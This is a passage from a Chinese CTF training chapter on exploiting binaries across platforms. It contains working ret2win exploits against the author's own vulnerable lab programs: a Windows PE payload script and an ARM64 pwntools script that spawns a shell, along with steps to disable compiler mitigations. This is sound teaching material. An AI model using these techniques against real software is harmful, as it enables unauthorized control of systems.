---
chapter: PWN
section: 多平台 PWN
order: 320
tags:
  - CTF
  - PWN
  - 多平台
publish: true
---

# P20 多平台 PWN
## Multi-Platform PWN

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L4 高级与实战期 ｜ **前置要求**：[[P06-栈溢出原理与ret2win|P6]] · [[P12-glibc堆管理机制|P12]] · [[R13-多平台逆向专题|R13]]
> **本章目标**：拿到非 x86-glibc 的目标时，先判断它属于哪个平台，再把已经掌握的利用思路迁移过去——本章亲手打穿 Windows PE 与 ARM64 两道完整示例，把 musl、容器逃逸、浏览器/V8 三类进阶环境各建立起正确的第一印象。

[[P01-PWN导论与缓解机制全景|P1]] 到 [[P17-堆风水与通用利用思路|P17]] 的目标全是同一个组合：x86-64 架构、Linux 系统、glibc 运行库。真实赛题与真实世界不只有这一种组合——Windows 的 PE、手机的 ARM64、路由器里的 musl、容器与浏览器，各自换掉坐标系里的一部分。

==换平台不换骨架==。[[P06-栈溢出原理与ret2win|P6]] 建立的五步流程（查保护 → 找漏洞点 → 算偏移 → 构造利用链 → 打目标）在任何平台上都成立；变的只是每一步里的具体答案：查保护用什么工具、偏移指向哪个槽、gadget 长什么形状、堆管理器是哪一套。本章每个平台都按"坐标系变了什么 → 利用链怎么拼 → 完整打一遍"的顺序展开。

## 1. 分流：拿到陌生目标先问四个问题

[[R13-多平台逆向专题|R13]] 的三步定性（魔数 → 字符串 → 结构）回答"这个文件是谁"；PWN 视角还要往下再问一层，四个问题的答案直接决定用哪套打法：

| 问题 | 用什么回答 | 答案指向 |
| ---- | ---- | ---- |
| 架构是什么 | `file` / `readelf -h` 的 Machine 字段 | x86-64 → 前文全套；`ARM aarch64` → 第 3 节；识别细节 [[R13-多平台逆向专题\|R13]] |
| 操作系统是什么 | 魔数分 ELF/PE；ELF 再看程序头 | PE（`MZ` 开头）→ 第 2 节；ELF → 下一问 |
| libc 是哪家 | 动态：INTERP 路径与 NEEDED 项；静态：strings 指纹 | `ld-linux` + `libc.so.6` → glibc，前文原样适用；`ld-musl` + `libc.so` → 第 4 节 |
| 静态还是动态 | `file` 输出里 `statically linked` | 静态 → gadget 海量、无版本匹配（[[P07-ret2libc-ret2syscall-ret2shellcode\|P7]] 的 ret2syscall 前提） |

四个问题过完，平台的"坐标系"就齐了。本章后续各节就是把这四个问题的不同答案组合各讲一遍：Windows PE（架构不变、系统换）、ARM64（架构换）、musl（libc 换）、容器与浏览器（整个攻击面换）。

> [!note] 先分流，再动手
> ==平台认错是这类题最大的时间黑洞==：拿 gdb 调 PE、拿 ROPgadget 的 x86 习惯套 ARM64，都会在第一步就撞墙。四个问题的成本不到一分钟，永远先做完再动手。

## 2. Windows PWN

Windows 题的附件是 PE 文件。本节的目标：认出 PE 的保护位、弄清 Windows x64 的调用约定、把一道 ret2win 完整打通。

### 2.1 保护识别：读 PE 头的 DllCharacteristics

[[P04-Linux安全缓解机制|P4]] 的 checksec 只认 ELF——直接喂 PE 会报错：

```bash
pwn checksec vuln.exe
```

输出：

```
vuln.exe: Magic number does not match
```

PE 的保护判读退回手工：`objdump -x` 读 Optional Header。演示程序是 2.3 节的 `win_pe.c`，用 mingw-w64 交叉编译器编出真实的 PE（在任何 Windows 机器上直接运行，不需要 wine）：

```bash
x86_64-w64-mingw32-gcc -O0 win_pe.c -o vuln_full.exe
objdump -x vuln_full.exe | grep -E "Magic|ImageBase|Subsystem|DllCharacteristics"
```

输出：

```
Magic			020b	(PE32+)
ImageBase		0000000140000000
MajorSubsystemVersion	5
MinorSubsystemVersion	2
Subsystem		00000003	(Windows CUI)
DllCharacteristics	00000160
```

逐项看关键的四个：`PE32+` 是 64 位 PE（`010b` 是 32 位）；`ImageBase 0x140000000` 是 exe 的默认装载基址（ELF 非 PIE 的对应常量是 `0x400000`）；`Subsystem CUI` 是控制台程序；`DllCharacteristics 0x0160` 是==保护位的集中地==，逐位拆开：

| 位值 | 名称 | 含义 | Linux 侧的对应物 |
| ---- | ---- | ---- | ---- |
| 0x0020 | HIGH_ENTROPY_VA | 随机化使用高熵的地址空间 | ASLR 的加强位 |
| 0x0040 | DYNAMIC_BASE | 镜像基址随机化 | PIE 的对应物 |
| 0x0100 | NX_COMPAT | DEP：数据页不可执行 | NX |
| 0x4000 | GUARD_CF | CFG：间接跳转前校验目标是否合法着陆点 | 无直接对应（CFI 类，[[P04-Linux安全缓解机制\|P4]] 的 CET 一族思路相近） |

`0x0160 = 0x0100 + 0x0040 + 0x0020`——这份产物默认开了 ASLR 与 DEP，没开 CFG。==GS 不在这 16 位里==：它是 MSVC 的 `/GS` 编译期机制，痕迹在 Load Configuration 目录的 SecurityCookie 字段与符号表里。两处一起查：

```bash
objdump -x vuln_full.exe | grep "Load Configuration"
objdump -t vuln_full.exe | grep -i security_cookie
```

输出：

```
Entry a 0000000000000000 00000000 Load Configuration Directory
```

目录值为 0；第二条命令没有任何输出——符号表里搜不到 `security_cookie`。==mingw gcc 默认不开 GS==，这份产物的栈上没有金丝雀。要在 Windows 题里确认"有没有 GS"，这两处就是判据；`-fstack-protector` 编译选项可以把它打开。

做题时把保护关到和 [[P06-栈溢出原理与ret2win|P6]] 的演示程序同一水位，链接器认一组 `--disable-*` 选项：

```bash
x86_64-w64-mingw32-gcc -O0 -fno-stack-protector \
  -Wl,--disable-dynamicbase,--disable-high-entropy-va,--disable-nxcompat \
  win_pe.c -o vuln.exe
objdump -x vuln.exe | grep DllCharacteristics
```

输出：

```
DllCharacteristics	00000000
```

全部清零。编译时那条警告也和 Linux 不同——mingw 在==编译期==就用属性警告点名的危险函数：

输出：

```
win_pe.c:21:5: warning: call to 'gets' declared with attribute warning: Using gets() is always unsafe - use fgets() instead [-Wattribute-warning]
```

> [!info]- CFG 与 CET 的关系
> CFG（Control Flow Guard）是 Windows 的编译期+运行期控制流防护：间接 call/jmp 前插入一段校验，目标必须是编译器登记过的合法着陆点，否则进程立刻终止。它挡的正是 ROP 的命门——任意间接跳转。启用后 DllCharacteristics 出现 0x4000 位、Load Configuration 目录非零（里面有合法着陆点的函数表 GFIDS）。x86-64 Linux 侧思路相近的是 Intel CET 的 IBT（shadow stack 与着陆点校验，[[P01-PWN导论与缓解机制全景|P1]] 第 3 节的 SHSTK/IBT 两行）。入门栈题两者都默认不设防，但==见到 0x4000 位或 IBT+SHSTK 时，纯返回地址劫持要重新评估==。

### 2.2 Windows x64 调用约定：RCX/RDX/R8/R9 与 shadow space

Windows x64 的参数传递规则（下称 Microsoft x64 ABI）与 Linux 的 System V AMD64 ABI 是两套规矩（本节汇编均为 Windows x64 / Microsoft x64 ABI）：

| | System V AMD64（Linux） | Microsoft x64（Windows） |
| ---- | ---- | ---- |
| 整型/指针参数 | 前 6 个走寄存器：rdi、rsi、rdx、rcx、r8、r9 | 前 4 个走寄存器：rcx、rdx、r8、r9 |
| 第 5 个起 | 压栈 | 压栈 |
| 调用方预留 | 无 | ==32 字节 shadow space==：调用方必须在栈上留出这 32 字节，被调函数有权把寄存器参数写进去 |
| 栈对齐 | call 前 rsp ≡ 0 (mod 16)，入口 rsp ≡ 8 | 相同：call 前 rsp ≡ 0 (mod 16)，入口 rsp ≡ 8 |
| 返回值 | rax | rax |

shadow space 是两套 ABI 最容易忽视的差异。用一个 6 参数函数把它和"寄存器 + 栈"混合传参一次看全（`args6.c`，mingw 默认参数编译）：

```bash
objdump -d -M intel args6.exe | sed -n '/<main>:/,/^$/p' | head -14
```

输出：

```asm
; Windows x64 / Microsoft x64 ABI
00000001400014b0 <main>:
   1400014b0:	55                   	push   rbp
   1400014b1:	48 89 e5             	mov    rbp,rsp
   1400014b4:	48 83 ec 30          	sub    rsp,0x30
   1400014bd:	c7 44 24 28 06 00 00 	mov    DWORD PTR [rsp+0x28],0x6   ; 第 6 参数：栈上
   1400014c5:	c7 44 24 20 05 00 00 	mov    DWORD PTR [rsp+0x20],0x5   ; 第 5 参数：栈上
   1400014cd:	41 b9 04 00 00 00    	mov    r9d,0x4                    ; 第 4 参数
   1400014d3:	41 b8 03 00 00 00    	mov    r8d,0x3                    ; 第 3 参数
   1400014d9:	ba 02 00 00 00       	mov    edx,0x2                    ; 第 2 参数
   1400014de:	b9 01 00 00 00       	mov    ecx,0x1                    ; 第 1 参数
   1400014e3:	e8 98 ff ff ff       	call   140001480 <add6>
```

`sub rsp,0x30` 里包含了 0x20 的 shadow space；第 5、6 参数压在 shadow space 之上（`[rsp+0x20]`、`[rsp+0x28]`）。再看被调函数怎么接：

```bash
objdump -d -M intel args6.exe | sed -n '/<add6>:/,/^$/p' | head -10
```

输出：

```asm
; Windows x64 / Microsoft x64 ABI
0000000140001480 <add6>:
   140001480:	55                   	push   rbp
   140001481:	48 89 e5             	mov    rbp,rsp
   140001484:	89 4d 10             	mov    DWORD PTR [rbp+0x10],ecx   ; 未优化代码先把寄存器参数搬进 shadow space
   140001487:	89 55 18             	mov    DWORD PTR [rbp+0x18],edx
   14000148a:	44 89 45 20          	mov    DWORD PTR [rbp+0x20],r8d
   14000148e:	44 89 4d 28          	mov    DWORD PTR [rbp+0x28],r9d
   140001492:	8b 55 10             	mov    edx,DWORD PTR [rbp+0x10]
   …
   1400014a4:	8b 45 30             	mov    eax,DWORD PTR [rbp+0x30]   ; 第 5 参数：返回地址上方的第 5 槽
   1400014a9:	8b 45 38             	mov    eax,DWORD PTR [rbp+0x38]   ; 第 6 参数
```

被调函数入口处的栈：`[rbp+8]` 是返回地址，`[rbp+0x10]`–`[rbp+0x28]` 是 shadow space（寄存器参数的家），`[rbp+0x30]` 起是真正的栈上参数。==这张图在做 Windows ROP 时就是"参数槽在哪"的地图==。

对 [[P06-栈溢出原理与ret2win|P6]] 最重要的迁移点是对齐：==两套 ABI 对入口的 16 字节要求相同，因此 ret2win 那个"差 8 字节"的问题在 Windows 上原样存在==——`ret` 跳进 win 没有经过 call 压栈，入口比约定浅 8 字节，P6 5.3 的"垫一格裸 ret"在 Windows 同样是标准修法（2.3 现场演示）。

### 2.3 实战：ret2win 打通 Windows

漏洞程序与 [[P06-栈溢出原理与ret2win|P6]] 同型：`vuln` 里 `gets` 溢出，`win` 读 flag.txt。反汇编读三样东西（Windows x64 / Microsoft x64 ABI）：

```bash
objdump -d -M intel vuln.exe | sed -n '/<vuln>:/,/^$/p'
```

输出：

```asm
; Windows x64 / Microsoft x64 ABI
00000001400014f4 <vuln>:
   1400014f4:	55                   	push   rbp
   1400014f5:	48 89 e5             	mov    rbp,rsp
   1400014f8:	48 83 ec 40          	sub    rsp,0x40
   1400014fc:	48 8d 05 21 8b 00 00 	lea    rax,[rip+0x8b21]        # 14000a024 <.rdata+0x24>
   140001503:	48 89 c1             	mov    rcx,rax                 ; 参数走 rcx：与 SysV 的 rdi 不同
   140001506:	e8 a5 11 00 00       	call   1400026b0 <__mingw_printf>
   14000150b:	48 8d 45 e0          	lea    rax,[rbp-0x20]          ; buf 在 rbp-0x20
   14000150f:	48 89 c1             	mov    rcx,rax
   140001512:	e8 91 70 00 00       	call   1400085a8 <gets>        ; 漏洞点
   140001517:	90                   	nop
   140001518:	48 83 c4 40          	add    rsp,0x40
   14000151c:	5d                   	pop    rbp
   14000151d:	c3                   	ret
```

三样各归各位：buf 在 `rbp-0x20` 占 32 字节——偏移 40，与 P6 完全一致；参数走 rcx——调用约定换血的直接证据；`win` 的地址用 `nm` 查到：

```bash
x86_64-w64-mingw32-nm vuln.exe | grep " T win"
```

输出：

```
0000000140001480 T win
```

==偏移、覆盖、ret2win 的骨架原封不动，换的只有调用约定与地址空间==。先按 P6 的直跳版生成 payload（32 字节 buf + 8 字节 saved rbp + win 地址），同目录放好 flag.txt，运行：

```python
#!/usr/bin/env python3
# gen_payload.py —— 生成 payload.bin（任何带 struct 的 Python 都能跑，WSL 与 Windows 均可）
import struct

OFFSET = 32             # buf：32 字节
WIN    = 0x140001480    # nm 查到的 win 地址

open('payload.bin', 'wb').write(
    b'A' * OFFSET + b'B' * 8
    + struct.pack('<Q', WIN)
    + b'\n'             # gets 的停止符
)
```

```bash
echo 'flag{p19_windows_ret2win}' > flag.txt
python3 gen_payload.py
cmd.exe /c "vuln.exe < payload.bin"
```

输出：

```
input>
```

程序段错误退出，flag 没有出现——==这就是 2.2 预告的差 8 字节，Windows 上同样要垫对齐==，修法与 [[P06-栈溢出原理与ret2win#5.3 三种修法|P6 5.3]] 相同：搜一格裸 ret 垫在 win 之前。ROPgadget 对 PE 照常工作：

```bash
ROPgadget --binary vuln.exe --only "ret" | head -3
```

输出：

```
Gadgets information
============================================================
0x0000000140001000 : ret
```

改 gen_payload.py 的一处——在 WIN 之前插入 RET：

```python
OFFSET = 32
RET    = 0x140001000    # 裸 ret gadget：补回差的那 8 字节
WIN    = 0x140001480

open('payload.bin', 'wb').write(
    b'A' * OFFSET + b'B' * 8
    + struct.pack('<Q', RET)
    + struct.pack('<Q', WIN)
    + b'\n'
)
```

==mingw 产物是原生 PE，直接交给 Windows 执行==，payload 走文件重定向：

```bash
python3 gen_payload.py
cmd.exe /c "vuln.exe < payload.bin"
```

输出：

```
input> flag{p19_windows_ret2win}
```

flag 打印，win 返回时弹出的是无人控制的旧栈数据，程序随后段错误退出——==flag 已到手，收尾崩溃不影响结果==（[[P01-PWN导论与缓解机制全景|P1]] 5.5 的同款结论在 Windows 成立）。

> [!warning] Windows 侧的交互形态：payload 文件是主力
> pwntools 只装在 Linux（或 WSL）环境里，Windows 原生侧做题的常规形态是==脚本生成 payload 文件 + 程序重定向读入==，如上文两步。带交互的利用（泄露型 ret2libc 一类）要么在 WSL/虚拟机的 Linux 工具链里完成脚本部分、再把产物放到 Windows 侧执行，要么改用主办方指定的连接方式——==先把链在本地调通==这一点与任何平台相同。

> [!info]- mingw 产物里的 __main
> 2.2 的 main 反汇编里，第一条实际指令是 `call 1400015f0 <__main>`——mingw 运行时自己的初始化调用，负责静态 C++ 对象构造等杂务，与漏洞无关。读 mingw 产物的 main 时跳过它即可；同时注意 mingw 对 libc 函数的引用直接落在 `__mingw_printf` 一类的包装符号上，`gets` 则解析到 msvcrt.dll 的导入（`<gets>` 的地址在 0x140008xxx，属于导入跳板区）。

### 2.4 SEH 与虚函数：两个 Windows 特有话题

两个概念在 Windows 逆向上高频出现，各用一段说清对 PWN 的意义。

**SEH（Structured Exception Handling，32 位专属）。** 32 位 Windows 的异常处理把"处理函数指针链"直接放在栈上：每层 try 对应一条 SEH 记录（next 指针 + 处理函数指针），串成链。栈溢出可以把这条链一起盖掉——==异常触发时系统沿链找处理函数，调用的就是被篡改的指针==，这套打法叫 SEH overwrite。缓解机制 SafeSEH（校验处理函数在合法表内）与 SEHOP（校验链头）随后补上。==64 位 Windows 换成了表驱动==：异常处理信息放在 `.pdata`/`.xdata` 节里，栈上没有 SEH 链可盖，溢出打法回到"覆盖返回地址"的 [[P06-栈溢出原理与ret2win|P6]] 主线。所以 SEH 攻击是 32 位 Windows 题的专项，遇到 32 位 PE 附件时把它列入知识清单。

**C++ 虚函数。** 对象头部的 vptr 指向虚函数表，虚调用按 `取 vptr → 查槽位 → 间接调用` 三步走（[[R13-多平台逆向专题#6.2 vtable：多态在内存里的形状|R13 6.2]] 给过完整的内存形状与反汇编形状）。PWN 视角：==能改写对象内容，就能改写 vptr；能伪造对象，就能把虚调用引向任意地址==。识别"这是虚调用"靠逆向阶段的 vtable 符号与调用形状，利用则是典型的"任意写 + 一次虚调用"组合。Windows 与 Linux 在这一条上没有平台差异，是纯 C++ 话题。

调试工具：[[R06-动态调试GDB与x64dbg|R06]] 第 12 节已把 x64dbg 的键位与字符串定位流程讲全，Windows PE 的动态调试直接照做；微软自家的 WinDbg 定位相同（命令语法不同，内置 `!peb`、`!teb` 等查看进程结构的扩展），概念上"另一个 x64dbg"，用到时查文档即可。

## 3. ARM64 PWN

手机与嵌入式设备的架构是 AArch64（ARM64）。本节完整走一遍：交叉编译 → qemu 运行 → 调用约定与栈形状 → 偏移 → gadget → pwntools 驱动 qemu getshell。

### 3.1 交叉编译与 qemu 运行

工具三件套：交叉编译器 `aarch64-linux-gnu-gcc`、用户态模拟器 `qemu-aarch64`、交叉版 objdump（随编译器包附带的 `aarch64-linux-gnu-objdump`）。交叉编译的产物是 aarch64 的 ELF，x86 主机执行会报 exec format error，交给 qemu（`-L` 指定目标架构动态库的所在，[[R13-多平台逆向专题#11.1 交叉编译、qemu 运行、反汇编：三件套|R13 11.1]] 讲过三件套的分工）：

```bash
aarch64-linux-gnu-gcc -O0 -fno-stack-protector -fno-pie -no-pie vuln_arm.c -o vuln_arm
file vuln_arm
```

输出：

```
vuln_arm.c:(.text+0x38): warning: the `gets' function is dangerous and should not be used.
vuln_arm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, BuildID[sha1]=3510574560f248e2edfef11e45d495ccfcbd0163, for GNU/Linux 3.7.0, not stripped
```

ELF 格式没变，Machine 换成 `ARM aarch64`，解释器路径是 aarch64 专属的 `ld-linux-aarch64.so.1`。运行：

```bash
echo hello | qemu-aarch64 -L /usr/aarch64-linux-gnu ./vuln_arm
```

输出：

```
input>
```

`-L` 指向交叉编译器包安装的目标架构 sysroot，qemu 从那里取 aarch64 的 libc 与加载器。静态编译（加 `-static`）可免掉 `-L`，但动态链接更贴近真实赛题形态，本章保留。

### 3.2 AArch64 调用约定与栈形状

AArch64 的调用规范叫 AAPCS64（ARM Procedure Call Standard，64 位）。核心规则（本节与 3.3–3.5 的汇编均为 AArch64 Linux / AAPCS64）：

- 参数走 ==x0–x7 共 8 个寄存器==，返回值在 x0；`w0` 是 x0 的低 32 位写法；
- ==返回地址不压栈==：`bl` 指令把返回地址写进 ==x30（LR，链接寄存器）==，`ret` 的语义是"跳到 x30"——对比 x86 的 call 压栈、ret 弹栈；
- ==没有 push/pop 指令==：成对存取用 `stp`/`ldp`。序言一条 `stp x29, x30, [sp, #-48]!` 同时完成"sp 减 48"和"把 x29（帧指针）与 x30 存到新 sp 处"；
- sp 在函数边界保持 16 字节对齐。

反汇编漏洞函数，把栈形状读出来：

```bash
aarch64-linux-gnu-objdump -d vuln_arm | sed -n '/<vuln>:/,/^$/p'
```

输出：

```asm
; AArch64 Linux / AAPCS64
00000000004007cc <vuln>:
  4007cc:	a9bd7bfd 	stp	x29, x30, [sp, #-48]!   ; sp -= 48；x29 存 sp+0，x30 存 sp+8
  4007d0:	910003fd 	mov	x29, sp
  4007d4:	90000000 	adrp	x0, 400000 <_init-0x5d0>
  4007d8:	91212000 	add	x0, x0, #0x848          ; 字符串地址两步构造（adrp+add）
  4007dc:	97ffffa1 	bl	400660 <printf@plt>
  4007e0:	910043e0 	add	x0, sp, #0x10           ; buf 在 sp+0x10
  4007e4:	97ffffa3 	bl	400670 <gets@plt>       ; 漏洞点
  4007e8:	d503201f 	nop
  4007ec:	a8c37bfd 	ldp	x29, x30, [sp], #48     ; 从 sp+0/sp+8 取回 x29/x30，sp += 48
  4007f0:	d65f03c0 	ret                             ; 跳 x30
```

栈形状画出来（48 字节的帧，从低地址向高地址）：

```asm
; vuln 的帧（AArch64 Linux / AAPCS64）
;   sp+0x00  保存的 x29（帧指针）     ← stp 存、ldp 取
;   sp+0x08  保存的 x30（返回地址）   ← stp 存、ldp 取
;   sp+0x10  buf[32]                 ← gets 从这里向上写
;   …帧到此为止（sp+0x30）…
;   caller（main）的帧从 sp+0x30 开始：main 的 x29 在 sp+0x30，main 的 x30 在 sp+0x38
```

==关键事实：保存的 x29/x30 在帧底，buf 在它们上面==。gets 从 buf 向高地址写，先冲出 vuln 自己的帧，盖到的是 ==caller（main）的帧==：main 的 x29 槽在 buf 起点 +32，main 的 x30 槽在 buf 起点 +40。vuln 自己的 x30 完好无损，它正常返回 main；main 收尾的 `ldp x29, x30, [sp], #16; ret` 才把被污染的 x30 装进寄存器——==控制点在 main 的 ret，不在 vuln 的 ret==。

> [!warning] AArch64 的偏移必须"对着反汇编量"
> 保存寄存器在帧底、数组在帧上，是这份产物里 gcc 的排法；==换编译选项、换编译器版本，或函数里还有别的局部变量时，数组与保存寄存器的相对位置都会变==。ARM64 量偏移的固定动作：在反汇编里同时找到两样东西——buf 的位置（`add x0, sp, #0x10` 一类）和 `ldp` 从哪个槽取 x30（`ldp x29, x30, [sp]` 在 sp+0/sp+8）——再量出 buf 起点到"会被装进 x30 的那个槽"的距离。位置关系不能背，每次都读。

### 3.3 偏移计算

按 3.2 的形状手算：buf 在 sp+0x10 占 32 字节，越过帧尾后再过 main 的 x29 槽 8 字节，到 main 的 x30 槽：

$$\text{offset} = (48 - 16) + 8 = 40 \tag{19.1}$$

cyclic 在 ARM64 同样适用——它只是字节模式串，与架构无关。生成、喂入、崩溃：

```bash
pwn cyclic -n 8 200 > cyc.bin
qemu-aarch64 -L /usr/aarch64-linux-gnu ./vuln_arm < cyc.bin
```

输出：

```
input> qemu: uncaught target signal 11 (Segmentation fault) - core dumped
```

==但 qemu-user 的崩溃只报一行，不给寄存器现场==——x86 上"gdb 里读 rsp 槽反查"的动作在这里没有直接对应物。ARM64 的偏移因此以反汇编手算为主（3.2 的方法），cyclic 用来确认"确实崩了"；要把崩溃现场看全，需要交叉架构调试器：`gdb-multiarch` 配合 `qemu-aarch64 -g 端口` 做远程调试，做题机上 `sudo apt install gdb-multiarch` 即可补上。

偏移差 8 会怎样，做一组对照（返回地址直接填 win，偏移只给 32）：

```bash
python3 -c "import struct; open('p32.bin','wb').write(b'A'*32 + struct.pack('<Q', 0x4007ac) + b'\n')"
qemu-aarch64 -L /usr/aarch64-linux-gnu ./vuln_arm < p32.bin
```

输出：

```
input> qemu: uncaught target signal 11 (Segmentation fault) - core dumped
```

同样崩溃，但没有任何 win 的迹象——==地址落进了 main 的 saved x29 槽，执行流根本没被劫持==。ARM64 排错的信号由此明确：==崩了不等于控制到了==，要看目标函数的效果（这里是与 shell 的交互）有没有出现。

### 3.4 gadget 搜索：ROPgadget 在 AArch64 上能找到什么

`ROPgadget --binary` 支持 AArch64，但要按 ARM 的现实调整预期。三个输出看全它的能力边界：

```bash
ROPgadget --binary vuln_arm | tail -1
ROPgadget --binary vuln_arm --depth 5 | tail -1
ROPgadget --binary vuln_arm --depth 15 | tail -1
```

输出：

```
Unique gadgets found: 173
Unique gadgets found: 74
Unique gadgets found: 270
```

`--depth` 控制"gadget 最长含多少条指令"（默认 10）：调大能翻出更深的片段，调小输出更干净。`--offset 0x400000` 可给全部结果统一加基址偏移，分析装载基址不同的固件模块时省一次换算。这个小到只有三个用户函数的程序里，173 条中值得认识的形状：

```
0x0000000000400618 : add x16, x16, #0 ; br x17
0x00000000004007b4 : adrp x0, #0x400000 ; add x0, x0, #0x840 ; bl #0x400630 ; nop ; ldp x29, x30, [sp], #0x10 ; ret
```

第一条是 PLT 跳板（`br x17` 跳到 GOT 项）；第二条是"准备参数 → bl 调用 → 帧收尾"的函数尾部形状。ARM64 搜 gadget 的三条铁律：

1. ==没有 x86 式的"中间切入"==：ARM64 指令定长 4 字节，字节流不存在"从中间某字节起读出另一条合法指令"的错位技巧，gadget 全部落在真实的指令边界上——==数量天然少于 x86==，"小程序搜不出想要的 gadget"是常态而不是异常；
2. ==没有 pop==：ARM64 没有"从栈弹进寄存器"的指令，`pop rdi; ret` 这类装载器不存在。装 x0 的候选是 `ldr x0, [sp, #N]` 变体、`ldp` 成对装载，或直接借用跳入时寄存器里现成的值——本例程序里一条干净的 `ldr x0, [sp,#…] ; ret` 都搜不到，这是真实水平的如实呈现；
3. ==链的节拍换了==：x86 ROP 靠 ret 逐格消费栈——ret 恰好"从栈取地址跳转"。ARM64 的 ==ret 只跳 x30，从栈上取地址的是 ldp==：链的基本单元是 `ldp x29, x30, [sp], #N ; ret`——ldp 把栈上下一组值装进 x29/x30，ret 跳 x30，=="x30 当中转站、栈当地址仓库"==。[[P08-ROP进阶与SROP|P8]] 在 x86 上学的 ret2csu 思想（借库函数的收尾代码批量装寄存器）在 ARM64 的对应物正是这类 ldp 收尾片段。

`bl` 与 `br`/`blr` 的区别也在这里说清：==bl 写 x30==（带返回的调用，跳出去还能回来）；==br/blr 不写 x30==（纯跳转，不留回程）。读 gadget 时留意：==链上出现 bl，x30 就会被改写==——它之后的 ret 跳的是 bl 刚写入的地址，不是你原先安排的值，链的设计要把这一点算进去。

### 3.5 完整 exploit：pwntools 驱动 qemu getshell

`win` 调 `system("/bin/sh")`。反汇编把它和地址一起读出来：

```bash
aarch64-linux-gnu-objdump -d vuln_arm | sed -n '/<win>:/,/^$/p'
aarch64-linux-gnu-nm vuln_arm | grep ' T win'
```

输出：

```asm
; AArch64 Linux / AAPCS64
00000000004007ac <win>:
  4007ac:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
  4007b0:	910003fd 	mov	x29, sp
  4007b4:	90000000 	adrp	x0, 400000 <_init-0x5d0>
  4007b8:	91210000 	add	x0, x0, #0x840          ; "/bin/sh" 在 0x400840
  4007bc:	97ffff9d 	bl	400630 <system@plt>
  4007c0:	d503201f 	nop
  4007c4:	a8c17bfd 	ldp	x29, x30, [sp], #16
  4007c8:	d65f03c0 	ret

00000000004007ac T win
```

`win` 在 0x4007ac，运行目录里放好 flag.txt（shell 的 `cat` 要读它）。exploit：

```python
#!/usr/bin/env python3
# exp_arm.py —— ARM64 ret2win：pwntools 驱动 qemu-aarch64 完成 getshell
from pwn import *
import time

context.arch = 'aarch64'
context.log_level = 'info'

OFFSET = 40            # 式 19.1：buf 32 字节 + main 的 x29 槽 8 字节
WIN    = 0x4007ac      # nm 查到的 win 地址

io = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu', './vuln_arm'])
io.recvuntil(b'input> ')
io.sendline(b'A' * OFFSET + p64(WIN))

time.sleep(0.5)                       # 等 gets 读完 payload 再发 shell 命令：命令早到会被 stdio 缓冲一并吞掉
io.sendline(b'cat flag.txt; echo p19_arm_shell_ok')
io.sendline(b'exit')
print(io.recvall(timeout=5).decode(errors='replace'))
io.close()
```

```bash
python3 exp_arm.py
```

输出：

```
[x] Starting local process '/usr/bin/qemu-aarch64'
[+] Starting local process '/usr/bin/qemu-aarch64': pid 6095
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 23B
[x] Receiving all data: 40B
[+] Receiving all data: Done (40B)
[*] Stopped process '/usr/bin/qemu-aarch64' (pid 6095)
flag{p19_arm64_ret2win}p19_arm_shell_ok
```

flag 与命令回显一并到手——==shell 起来了，cat 执行了==。四个要点：

- **process 的写法**：qemu 当作程序本体启动（`process(['qemu-aarch64', '-L', …, './vuln_arm'])`），[[P05-pwntools与GDB插件工具链|P5]] 的收发函数原样可用，==payload 与 x86 的写法只差 OFFSET 和地址==；`p64` 仍是 8 字节小端打包（`context.arch = 'aarch64'` 下语义不变）。
- **payload 与命令之间留间隔**：命令若赶在 payload 同一批到达，会被 gets 底层的缓冲一并读走、随 execve 丢失——[[P06-栈溢出原理与ret2win#7. 输入函数与 payload：gets 与 read 的差别|P6 第 7 节]]的节奏在 qemu 下原样适用。
- **没有垫对齐 gadget**：bl 不压栈，AAPCS64 的入口约定是 sp ≡ 0 (mod 16)；本链经 main 的 `ldp …, [sp], #16` 跳入 win 时 sp 恰好保持 16 对齐——==x86 的"差 8"问题在 ARM64 上不存在==。这不是运气，是 `bl`/`ret` 都不动 sp 的直接推论。
- **win 返回后的行为无人兜底**：shell 退出后 win 的 ldp 装回被污染的栈数据，程序如何收尾不重要——目标已达成。

> [!info]- qemu-user 里 execve("/bin/sh") 的去向
> 模拟进程执行 `system("/bin/sh")`，最终落到 `execve("/bin/sh")`。qemu-user 把这个 execve 交给宿主内核执行：宿主上的 `/bin/sh` 是 x86-64 的原生 shell，内核直接运行它，==stdin/stdout 是模拟进程的那两根管道==。于是"模拟的 aarch64 进程里起了一个原生的 shell"，我们发出的 `cat flag.txt` 由原生 shell 执行。这也是 qemu-user 打 ARM 题能 getshell 的原因：交互通路完全继承。若宿主上同路径不存在可执行文件，execve 才会失败——那是环境问题，不是利用问题。

### 3.6 AAPCS64 与 x64 差异速查表

| | x86-64（System V AMD64） | AArch64（AAPCS64） |
| ---- | ---- | ---- |
| 参数寄存器 | rdi、rsi、rdx、rcx、r8、r9 | ==x0–x7 共 8 个== |
| 返回值 | rax | x0 |
| 返回地址 | call 压栈、ret 弹栈 | ==bl 写 x30，ret 跳 x30，不压栈== |
| 帧寄存器 | rbp（习惯使用） | x29（FP）与 x30（LR）==成对==保存 |
| 压栈/弹栈 | push/pop 单寄存器 | ==无 push/pop==，stp/ldp 成对 |
| 入口对齐 | rsp ≡ 8 (mod 16)，ret2win 差 8 | ==sp ≡ 0 (mod 16)，bl/ret 都不动 sp，无差 8== |
| 装参数的 gadget | `pop rdi ; ret` 遍地 | `ldr`/`ldp` 变体，数量少，常借现成寄存器 |
| 链的节拍 | `ret` 逐格消费栈 | `ldp x29, x30, [sp], #N ; ret` |
| 地址打包 | p64（8 字节小端） | p64（同左） |

## 4. musl libc 的 PWN

x86-64 与 glibc 之外最常见的 libc 变体是 musl：Alpine Linux 的默认 libc、嵌入式系统与大量路由器的选择，CTF 里常与 ARM64 组成"aarch64 + musl"的物联网题配置。==musl 换的是 libc，架构与操作系统没换==——所以调用约定、ELF 格式、栈利用的骨架全部不变，真正要重学的只有堆。

### 4.1 识别与编译

识别靠两条硬特征。动态链接的 musl 程序，==程序头里请求的解释器是 `ld-musl-*.so.1`==（glibc 是 `ld-linux-*.so.2`），依赖列表里写的是 ==`libc.so`==（glibc 是 `libc.so.6`）；静态链接的产物里，strings 能扫到 musl 的版本信息。装好 musl 工具链（Ubuntu 包 `musl-tools`，含 `musl-gcc` 编译器包装与 musl 本体）后，同一份 hello.c 编两个版本：

```bash
